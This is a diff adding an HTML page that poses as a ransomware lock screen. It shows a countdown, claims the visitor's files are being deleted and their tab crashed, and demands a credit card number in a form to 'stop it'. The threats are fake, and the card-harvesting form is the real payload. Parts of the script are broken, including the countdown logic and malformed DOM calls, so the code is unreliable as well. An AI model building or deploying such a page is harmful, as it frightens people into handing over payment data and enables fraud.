@@ -1,0 +1,62 @@
+<head>
+    <style>
+        #timer {
+            font-size:60px;
+        }
+    </style>
+</head>
+<body id="body">
+  <span id="timer"></span>
+  <script>
+    document.getElementById('timer').innerHTML = 9 + ":" + 59;
+    startTimer();	
+    function startTimer() {
+      var presentTime = document.getElementById('timer').innerHTML;
+      var timeArray = presentTime.split(/[:]+/);
+      var m = timeArray[0];
+      var s = checkSecond((timeArray[1] - 1));
+      if(s==59){
+        m=m-1
+      }
+      if(m === 0 || s === 0) {
+        end();
+      }
+      document.getElementById('timer').innerHTML = m + ":" + s;
+      setTimeout(startTimer, 1000);
+  }
+  
+    function checkSecond(sec) { 
+      if (sec < 10 && sec >= 0) {
+        sec = "0" + sec
+      }; 
+      // add zero in front of numbers < 10
+      if (sec < 0) {
+        sec = "59"
+      };
+      return sec;
+    }
+    function end() {
+      document.getElementById("body").innerHTML = '<span id="end">TIMES UP<br>Deleting files...</span><span id="end2"></span>';
+      setTimeout(end, 5000);
+      end2();
+    }
+    function end2() {
+      document.getElementById("end2").innerHTML = 'Crashing Tab...';
+      console.error("tabCrasher.console.error.message(unexpectedError.virus)");
+    }
+  </script>
+  <h1><strong>THIS IS WHEN YOUR FILES WILL BE DELETED</strong></h1>
+  <h2><strong>YOU CAN STOP IT! HERES HOW!</strong></h2>
+  <h3>Enter your credit card:</h3>
+  <form method="post">
+    <input type="text" pattern="\d*" minlength="16" maxlength="16" id="cc_input" name="cc_num">
+    <script>
+      if(document.getElementById("cc_input").toString().length() < 16) {
+        var nums = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"];
+        document.write('<span id="error1">UNEXPECTED ERROR: credit card number was not long enough. Error code: </span>');
+        document.write('error1').innerHtml = document.getElementById("error1") + nums[Math.round(Math.random(1, 10))] + nums[Math.round(Math.random         (1, 10))] + nums[Math.round(Math.random(1, 10))] + nums[Math.round(Math.random(1, 10))];  
+      }
+    </script> 
+    <input type="submit" value="submit" name="submit"  onclick="window.open(decryptGenorator.html, _top)">
+  </form>
+</body>
